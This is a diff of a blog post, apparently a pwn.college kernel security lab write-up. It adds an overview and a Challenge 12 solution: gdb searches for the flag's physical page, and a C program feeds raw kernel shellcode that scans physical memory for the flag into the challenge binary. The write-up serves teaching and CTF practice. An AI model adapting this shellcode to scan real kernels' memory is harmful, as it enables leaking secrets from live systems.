@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "Pwn College - Kernel Security"
+title:  "Pwn College - Kernel Security 1"
 date:   2024-05-23 19:59:45 +0300
 categories: jekyll update
 ---
@@ -9,6 +9,9 @@ categories: jekyll update
 * TOC
 {:toc}
 ## Overview
+
+This is the first module (currently out of 5) dealing with kernel security. The focus isn't direct exploitation, but instead generic hands-on knowledge regarding the kernel API, debugging methods, virtual to physical memory translation, user and kernel interaction and so on. \
+I find this module very good, as it teaches kernel security from the very basics, towards intermediate level. 
 
 ## Background
 
@@ -862,6 +865,83 @@ def main():
 The since we call `printk` within the shellcode, the flag's content may be read via `dmesg`. 
 
 ## Challenge 12
+
+The kernel module is exactly the same, and there's still no KASLR. However, the userspace component now terminates the child process upon loading the flag to its memory. **This means that the flag's corresponding physical page may now be swapped out**. Hence, we will no longer be able to traverse over so many pages, as it would definently cause a swap out of our goal flag's page. \
+Instead, because there's no KASLR (but there are still pretty randomized allocations at the physical address space), we can predict a somewhat wrapping region where the flag's physical page resides, and only perform the scan from there. Moreover, notice we wouldn't like to use the python interpreter - as it uses lots of pages, and may trigger great physical pages swap-out. \
+By kernel debugging right after the child had terminated and before the shellcode have been executed, using the following command I could find the flag's address:
+
+```bash
+(gdb) find /b page_offset_base, +0x80000000, 'p', 'w', 'n', '.', 'c', 'o', 'l', 'l', 'e', 'g', 'e', '{'
+0xffff888003399040
+```
+
+After repeating this procedure multiple times, I've found the flag was also loaded to the following addresses:
+
+```bash
+0xffff888003320040
+0xffff8880033ed040
+```
+ 
+So the goal physical page is always allocated somewhere near `0x3300000`. However, when I think about it - the amount of traversed pages within `page_offset_base` have no major impact about the exploit's statistics. The reason behind this, is that **all pages within page_offset_base** are already mapped to physical memory, by definition. Hence - accessing them should not cause any page swap-out. \
+Using a python interpreter - does, as during the time frame between the child's termination and the input that is being sent towards the parent, the python interpreter does many high-level operations, that may easily cause swap out. 
+
+```c
+#define SHELLCODE_SIZE 0x1000
+#define BINARY "/challenge/babykernel_level12.0"
+
+int main(int argc, char* argv[])
+{
+    int res = 0;
+
+    uint8_t shellcode[SHELLCODE_SIZE] = { 0x48, 0xC7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x35, 0x10, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x00, 0x10, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x80, 0x88, 0xFF, 0xFF, 0x8A, 0x0B, 0x80, 0xF9, 0x70, 0x75, 0x5A, 0x8A, 0x4B, 0x01, 0x80, 0xF9, 0x77, 0x75, 0x52, 0x8A, 0x4B, 0x02, 0x80, 0xF9, 0x6E, 0x75, 0x4A, 0x8A, 0x4B, 0x03, 0x80, 0xF9, 0x2E, 0x75, 0x42, 0x8A, 0x4B, 0x04, 0x80, 0xF9, 0x63, 0x75, 0x3A, 0x8A, 0x4B, 0x05, 0x80, 0xF9, 0x6F, 0x75, 0x32, 0x8A, 0x4B, 0x06, 0x80, 0xF9, 0x6C, 0x75, 0x2A, 0x8A, 0x4B, 0x07, 0x80, 0xF9, 0x6C, 0x75, 0x22, 0x8A, 0x4B, 0x08, 0x80, 0xF9, 0x65, 0x75, 0x1A, 0x8A, 0x4B, 0x09, 0x80, 0xF9, 0x67, 0x75, 0x12, 0x8A, 0x4B, 0x0A, 0x80, 0xF9, 0x65, 0x75, 0x0A, 0x8A, 0x4B, 0x0B, 0x80, 0xF9, 0x7B, 0x75, 0x02, 0xEB, 0x06, 0x48, 0x83, 0xC3, 0x01, 0xEB, 0x99, 0x48, 0x89, 0xDF, 0x48, 0xC7, 0xC3, 0xA9, 0x69, 0x0B, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
+    
+    int exploit_pipe[2] = {0};
+    if (pipe(exploit_pipe) < 0)
+    {
+        goto cleanup;
+    }
+
+    pid_t pid = fork();
+    if (pid < 0)
+    {
+        goto cleanup;
+    }
+
+    else if (pid == 0)
+    {
+        /* Child */
+        if (dup2(exploit_pipe[0], STDIN_FILENO) < 0)
+        {
+            goto cleanup;
+        }
+        close(exploit_pipe[0]);
+        close(exploit_pipe[1]);
+
+        char *const argv[] = { BINARY, 0 };
+        execve(argv[0], argv, 0);
+    }
+
+    else
+    {
+        /* Parent */
+        if (write(exploit_pipe[1], shellcode, sizeof(shellcode)) < 0)
+        {
+            goto cleanup;
+        }
+        int wstatus = 0;
+        waitpid(pid, &wstatus, 0);
+    }
+
+    close(exploit_pipe[0]);
+    close(exploit_pipe[1]);
+
+    return 0;
+
+cleanup:
+    printf("error: %s\n", strerror(errno));
+    return 1;
+}
+```
 
 
 
